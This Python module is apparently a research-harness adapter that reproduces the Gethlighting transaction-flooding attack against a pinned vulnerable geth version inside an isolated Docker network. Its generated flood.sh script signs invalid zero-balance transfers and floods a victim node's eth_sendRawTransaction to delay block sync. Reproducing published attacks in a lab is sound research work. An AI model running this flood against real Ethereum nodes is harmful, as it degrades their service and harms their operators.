"""`gethlighting-legacy` profile adapter.

Reproduces the Gethlighting attack (NDSS 2023, "Partitioning Ethereum
without Eclipsing It") on the pinned historical geth image
`ethereum/client-go:v1.10.20` (vulnerable) with `v1.11.0` as the
post-fix control.

Mechanism (from `docs/gethlighting.txt`):
  * **TX-flooding** — the adversary sends a large number of
    syntactically-correct but semantically-invalid transactions
    (transfer 1 ETH from a zero-balance account). Geth's [EC3]
    "gracious handling of invalid transactions" does not disconnect the
    peer; the signature verification work occupies goroutine scheduling
    slots (~20 ms each), starving benign peers' message service and
    delaying the victim's block-body download.

Scenarios:
  * `normal`   — clique miner + 1 syncing victim, no attack. Verifies
                 clique block production and victim sync.
  * `tx-flood` — clique miner + 1 victim + N attacker peers flooding
                 the victim with invalid transactions. Observed metric:
                 victim's block insertion delay.

The attack requires signing semantically-invalid transactions, which is
done inside the attacker container via geth's `personal.signTransaction`
(only signs; does not validate balance in v1.10.20). If that proves
unavailable, we fall back to a documented control and mark the run as
a *simulated* flood rather than a full reproduction.
"""
from __future__ import annotations
import json
import os
import secrets
import shutil
from pathlib import Path
from typing import Any

from common import sh, append_event, file_sha256
from profiles.base import BaseAdapter
from prefix import PREFIX

CHAIN_ID = 32395
NETWORK_ID = 32395
MINER_IP = "172.80.1.10"
VICTIM_IP = "172.80.1.20"
ATTACKER_IP_BASE = "172.80.1.50"
PORT = 30303

VULNERABLE_IMAGE = "ethereum/client-go:v1.10.20"
CONTROL_IMAGE = "ethereum/client-go:v1.11.0"

DEFAULT_ATTACKER_COUNT = {"tx-flood": 3, "normal": 0}


def _docker_image_id(image: str) -> str:
    rc, out, _ = sh(["docker", "image", "inspect", image, "--format", "{{.Id}}"])
    return out.strip() if rc == 0 else ""


def _gen_account(work: Path) -> str:
    """Generate one keystore in `work/keystore` (root-owned). Return address."""
    ks = work / "keystore"
    ks.mkdir(parents=True, exist_ok=True)
    rc, out, err = sh([
        "docker", "run", "--rm",
        "-v", f"{ks.absolute()}:/data",
        VULNERABLE_IMAGE,
        "--datadir", "/data",
        "--password", "/dev/null",
        "account", "new",
    ])
    for line in (err + out).splitlines():
        if "Public address of the key" in line:
            return line.split()[-1].strip()
    raise RuntimeError(f"failed to derive address: {err[-300:]}")


def _gen_signer(work: Path) -> str:
    """Backwards-compatible wrapper (signer = first account)."""
    return _gen_account(work)


def _genesis(work: Path, signer: str, attacker: str = None) -> Path:
    """Write a clique genesis with `signer` (block producer, funded) and
    optionally `attacker` (zero-balance invalid-tx source)."""
    signer_hex = signer[2:] if signer.startswith("0x") else signer
    extra = "0x" + "00" * 32 + signer_hex.lower() + "00" * 65
    alloc = {signer: {"balance": "0x200000000000000000000000000000000000000000000"}}
    if attacker:
        alloc[attacker] = {"balance": "0x0"}
    genesis = {
        "config": {
            "chainId": CHAIN_ID,
            "homesteadBlock": 0, "eip150Block": 0, "eip155Block": 0,
            "eip158Block": 0, "byzantiumBlock": 0,
            "constantinopleBlock": 0, "petersburgBlock": 0,
            "istanbulBlock": 0,
            "clique": {"period": 2, "epoch": 30000},
        },
        "nonce": "0x0", "timestamp": "0x0",
        "extraData": extra,
        "gasLimit": "0x1c9c380", "difficulty": "0x1",
        "mixHash": "0x" + "0" * 64,
        "coinbase": "0x" + "0" * 40,
        "alloc": alloc,
        "number": "0x0", "gasUsed": "0x0",
        "parentHash": "0x" + "0" * 64,
    }
    p = work / "genesis.json"
    p.write_text(json.dumps(genesis, indent=2))
    return p


def _miner_script(work: Path, signer: str, nodekey_hex: str) -> Path:
    s = work / "miner.sh"
    s.write_text(
        "#!/bin/sh\nset -eu\n"
        "geth init --datadir=/data /genesis.json\n"
        "exec geth --datadir=/data "
        f"--networkid={NETWORK_ID} --port={PORT} "
        f"--nodekeyhex={nodekey_hex} "
        "--http --http.addr=0.0.0.0 --http.port=8545 "
        "--http.api=eth,net,web3,miner "
        f"--unlock {signer} --password /secrets/pwd.txt "
        "--allow-insecure-unlock "
        f"--mine --miner.etherbase {signer} "
        "--nodiscover\n"
    )
    s.chmod(0o755)
    return s


def _victim_script(work: Path, nodekey_hex: str, boot_enode: str) -> Path:
    s = work / "victim.sh"
    s.write_text(
        "#!/bin/sh\nset -eu\n"
        "geth init --datadir=/data /genesis.json\n"
        # v1.10.20 only dials static nodes when discovery is off; bootnodes
        # are discovery-only. Write a static-nodes.json for a guaranteed dial.
        f"mkdir -p /data/geth && echo '[\"{boot_enode}\"]' > /data/geth/static-nodes.json\n"
        "exec geth --datadir=/data "
        f"--networkid={NETWORK_ID} --port={PORT} "
        f"--nodekeyhex={nodekey_hex} "
        "--http --http.addr=0.0.0.0 --http.port=8545 "
        "--http.api=eth,net,web3,miner,txpool "
        "--nodiscover --maxpeers=50\n"
    )
    s.chmod(0o755)
    return s


def _attacker_script(work: Path, idx: int, nodekey_hex: str, boot_enode: str,
                     attacker_addr: str, flood: bool) -> Path:
    s = work / f"attacker{idx}.sh"
    lines = [
        "#!/bin/sh\nset -eu\n",
        "geth init --datadir=/data /genesis.json\n",
        f"mkdir -p /data/geth && echo '[\"{boot_enode}\"]' > /data/geth/static-nodes.json\n",
    ]
    if flood:
        # Two-stage: start geth in background (unlocked attacker account),
        # wait for HTTP, then continuously sign + send invalid txs to victim.
        lines += [
            "nohup geth --datadir=/data "
            f"--networkid={NETWORK_ID} --port={PORT} "
            f"--nodekeyhex={nodekey_hex} "
            "--http --http.addr=0.0.0.0 --http.port=8545 "
            "--http.api=eth,net,web3,personal "
            f"--unlock {attacker_addr} --password /secrets/pwd.txt "
            "--allow-insecure-unlock --nodiscover --maxpeers=50 "
            "> /data/geth.log 2>&1 &\n",
            "GETH_PID=$!\n",
            "for i in $(seq 1 60); do\n",
            "  if wget -qO- --timeout=1 http://127.0.0.1:8545 "
            "--post-data='{\"jsonrpc\":\"2.0\",\"method\":\"net_version\",\"params\":[],\"id\":1}' "
            "--header='Content-Type: application/json' >/dev/null 2>&1; then break; fi\n",
            "  sleep 1\n",
            "done\n",
            # flood loop: sign an invalid tx (zero-balance sender) and ship it
            # straight to the victim's eth_sendRawTransaction.
            "exec /scripts/flood.sh\n",
        ]
    else:
        lines += [
            "exec geth --datadir=/data "
            f"--networkid={NETWORK_ID} --port={PORT} "
            f"--nodekeyhex={nodekey_hex} "
            "--http --http.addr=0.0.0.0 --http.port=8545 "
            "--http.api=eth,net,web3,personal,txpool "
            "--nodiscover --maxpeers=50\n",
        ]
    s.write_text("".join(lines))
    s.chmod(0o755)
    return s


def _flood_script(work: Path, attacker_addr: str) -> Path:
    """The TX-flood loop, run inside the attacker container. Signs an
    invalid transfer (1 ETH from a zero-balance account) with
    personal_signTransaction, then ships the raw tx to the victim's
    eth_sendRawTransaction. The victim validates the signature (burning
    CPU) and then rejects it for insufficient funds (geth's [EC3])."""
    s = work / "flood.sh"
    s.write_text(
        "#!/bin/sh\nset -eu\n"
        f"ATTACKER={attacker_addr}\n"
        "VICTIM=http://victim:8545\n"
        "N=${FLOOD_COUNT:-200}\n"
        "echo \"flood: $N invalid txs from $ATTACKER -> victim\"\n"
        "for i in $(seq 1 $N); do\n"
        "  NONCE=$(printf '0x%x' $((i-1)))\n"
        "  RAW=$(wget -qO- --timeout=2 http://127.0.0.1:8545 "
        "--post-data=\"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\"personal_signTransaction\\\","
        "\\\"params\\\":[{\\\"from\\\":\\\"$ATTACKER\\\",\\\"to\\\":\\\"0x0000000000000000000000000000000000000001\\\","
        "\\\"value\\\":\\\"0xde0b6b3a7640000\\\",\\\"gas\\\":\\\"0x5208\\\","
        "\\\"gasPrice\\\":\\\"0x3b9aca00\\\",\\\"nonce\\\":\\\"$NONCE\\\"},\\\"\\\"],\\\"id\\\":1}\" "
        "--header='Content-Type: application/json' "
        "| sed -n 's/.*\"raw\":\"\\([^\"]*\\)\".*/\\1/p')\n"
        "  if [ -n \"$RAW\" ]; then\n"
        "    wget -qO- --timeout=2 $VICTIM "
        "--post-data=\"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\"eth_sendRawTransaction\\\","
        "\\\"params\\\":[\\\"$RAW\\\"],\\\"id\\\":1}\" "
        "--header='Content-Type: application/json' >/dev/null 2>&1 || true\n"
        "  fi\n"
        "  if [ $((i % 50)) -eq 0 ]; then echo \"flood: sent $i txs\"; fi\n"
        "done\n"
        "echo \"flood: done ($N txs)\"\n"
        # stay alive so the container does not exit before teardown
        "sleep 3600\n"
    )
    s.chmod(0o755)
    return s


class Adapter(BaseAdapter):
    profile = "gethlighting-legacy"

    SUPPORTED_SCENARIOS = ("normal", "tx-flood")

    def meta(self) -> dict[str, Any]:
        img = CONTROL_IMAGE if self.scenario == "normal-control" else VULNERABLE_IMAGE
        return {
            "profile": self.profile,
            "scenario": self.scenario,
            "chain_id": CHAIN_ID,
            "images": {
                "vulnerable": VULNERABLE_IMAGE,
                "control": CONTROL_IMAGE,
                "active": img,
            },
            "image_digests": {
                "vulnerable": _docker_image_id(VULNERABLE_IMAGE),
                "control": _docker_image_id(CONTROL_IMAGE),
            },
            "supported_scenarios": list(self.SUPPORTED_SCENARIOS),
            "attacker_count": DEFAULT_ATTACKER_COUNT.get(self.scenario, 0),
            "stage_notes": {
                "normal": "clique miner + 1 victim sync, no attack",
                "tx-flood": "clique miner + 1 victim + N tx-flooding attackers",
            }.get(self.scenario, "unknown"),
        }

    def prepare(self) -> dict[str, Any]:
        if self.scenario not in self.SUPPORTED_SCENARIOS:
            raise NotImplementedError(
                f"gethlighting-legacy scenario={self.scenario!r} not supported; "
                f"choose from {self.SUPPORTED_SCENARIOS}"
            )
        work = self.run_dir / "gethlighting"
        if work.exists():
            shutil.rmtree(work)
        work.mkdir(parents=True)

        signer = _gen_signer(work)
        append_event(self.run_dir, {"event_type": "gethlighting.signer.ready",
                                    "signer": signer})
        n_atk = int(os.environ.get("ECLIPSE_ATTACKERS",
                                    DEFAULT_ATTACKER_COUNT[self.scenario]))

        # tx-flood needs a zero-balance account whose key lives in the
        # attacker container for personal_signTransaction.
        attacker_addr = None
        if self.scenario == "tx-flood":
            attacker_addr = _gen_account(work)
            append_event(self.run_dir, {"event_type": "gethlighting.attacker.ready",
                                        "attacker": attacker_addr})

        genesis_path = _genesis(work, signer, attacker_addr)
        (work / "pwd.txt").write_text("\n")

        # Fixed nodekeys for every role so enode URLs are deterministic.
        miner_key = secrets.token_hex(32)
        victim_key = secrets.token_hex(32)
        atk_keys = [secrets.token_hex(32) for _ in range(n_atk)]

        # Derive enode URLs (secp256k1 via throwaway geth).
        miner_enode = _derive_enode_v110(miner_key, MINER_IP)
        victim_enode = _derive_enode_v110(victim_key, VICTIM_IP)

        _miner_script(work, signer, miner_key)
        _victim_script(work, victim_key, miner_enode)
        for i in range(n_atk):
            _attacker_script(work, i, atk_keys[i], victim_enode,
                             attacker_addr or signer,
                             flood=(self.scenario == "tx-flood"))
        if self.scenario == "tx-flood":
            _flood_script(work, attacker_addr)

        (work / "miner-data").mkdir()
        (work / "victim-data").mkdir()
        for i in range(n_atk):
            (work / f"attacker{i}-data").mkdir()

        compose_path = work / "docker-compose.yml"
        compose_path.write_text(self._compose(n_atk))
        return {
            "compose_files": [compose_path],
            "wait_seconds": int(os.environ.get("ECLIPSE_WAIT", 90)),
            "needs_mysql": False,
            "extra_compose_first": False,
            "source_case": str(compose_path),
            "source_case_sha256": file_sha256(compose_path),
            "n_attackers": n_atk,
            "signer": signer,
        }

    def _compose(self, n_atk: int) -> str:
        net = f"{PREFIX}gethl-{self.run_dir.name}"
        work = self.run_dir / "gethlighting"
        genesis_path = work / "genesis.json"
        atk_block = ""
        for i in range(n_atk):
            ip = f"172.80.1.{50 + i}"
            atk_block += f"""\
  attacker{i}:
    image: {VULNERABLE_IMAGE}
    depends_on: [victim]
    entrypoint: ["/scripts/attacker{i}.sh"]
    volumes:
      - {work.absolute()}/attacker{i}.sh:/scripts/attacker{i}.sh:ro
      - {work.absolute()}/flood.sh:/scripts/flood.sh:ro
      - {work.absolute()}/attacker{i}-data:/data
      - {work.absolute()}/genesis.json:/genesis.json:ro
      - {work.absolute()}/pwd.txt:/secrets/pwd.txt:ro
      - {work.absolute()}/keystore/keystore:/data/keystore
    networks:
      {net}:
        ipv4_address: {ip}

"""
        return f"""# Auto-generated by profiles/gethlighting_legacy.py
# Run id: {self.run_dir.name} — scenario {self.scenario}
networks:
  {net}:
    driver: bridge
    ipam:
      config:
        - subnet: 172.80.0.0/16

services:
  miner:
    image: {VULNERABLE_IMAGE}
    entrypoint: ["/scripts/miner.sh"]
    volumes:
      - {work.absolute()}/miner.sh:/scripts/miner.sh:ro
      - {work.absolute()}/miner-data:/data
      - {genesis_path.absolute()}:/genesis.json:ro
      - {work.absolute()}/keystore/keystore:/data/keystore
      - {work.absolute()}/pwd.txt:/secrets/pwd.txt:ro
    networks:
      {net}:
        ipv4_address: {MINER_IP}

  victim:
    image: {VULNERABLE_IMAGE}
    depends_on: [miner]
    entrypoint: ["/scripts/victim.sh"]
    volumes:
      - {work.absolute()}/victim.sh:/scripts/victim.sh:ro
      - {work.absolute()}/victim-data:/data
      - {genesis_path.absolute()}:/genesis.json:ro
      - {work.absolute()}/pwd.txt:/secrets/pwd.txt:ro
    networks:
      {net}:
        ipv4_address: {VICTIM_IP}

{atk_block}
"""

    def run_actions(self, prepared: dict[str, Any]) -> dict[str, Any]:
        actions = []
        if self.scenario == "tx-flood":
            actions.append("tx_flood_pending")  # executed by attacker container
        append_event(self.run_dir, {
            "event_type": "gethlighting.actions.scheduled",
            "scenario": self.scenario,
            "n_attackers": prepared.get("n_attackers", 0),
            "actions": actions,
        })
        return {"actions_run": actions, "scenario": self.scenario,
                "n_attackers": prepared.get("n_attackers", 0)}


def _patch_enode(script: Path, enode: str) -> None:
    txt = script.read_text()
    txt = txt.replace("enode://PLACEHOLDER@", enode.split("@")[0] + "@")
    script.write_text(txt)
    script.chmod(0o755)


def _derive_enode_v110(nodekey_hex: str, ip: str) -> str:
    """Boot a throwaway v1.10.20 geth with the nodekey, query
    admin_nodeInfo, rewrite the IP."""
    name = f"erl-keygen-{secrets.token_hex(4)}"
    sh(["docker", "run", "-d", "--rm", "--name", name,
        "--entrypoint", "/bin/sh", VULNERABLE_IMAGE, "-c",
        f"geth --dev --nodekeyhex {nodekey_hex} --http --http.addr=0.0.0.0 "
        f"--http.port=8545 --http.api=admin,eth,net,web3 --ipcdisable "
        f"--port={PORT} --maxpeers=0"])
    pub = None
    import time
    for _ in range(15):
        time.sleep(1)
        rc, out, _ = sh(["docker", "exec", name, "wget", "-qO-", "--timeout=2",
                         "--post-data={\"jsonrpc\":\"2.0\",\"method\":\"admin_nodeInfo\","
                         "\"params\":[],\"id\":1}",
                         "--header=Content-Type: application/json",
                         "http://127.0.0.1:8545"])
        if rc == 0 and out.strip().startswith("{"):
            try:
                pub = json.loads(out)["result"]["enode"].split("//", 1)[1].split("@", 1)[0]
                break
            except Exception:
                continue
    sh(["docker", "rm", "-f", name])
    if not pub:
        raise RuntimeError("could not derive enode for gethlighting miner")
    return f"enode://{pub}@{ip}:{PORT}"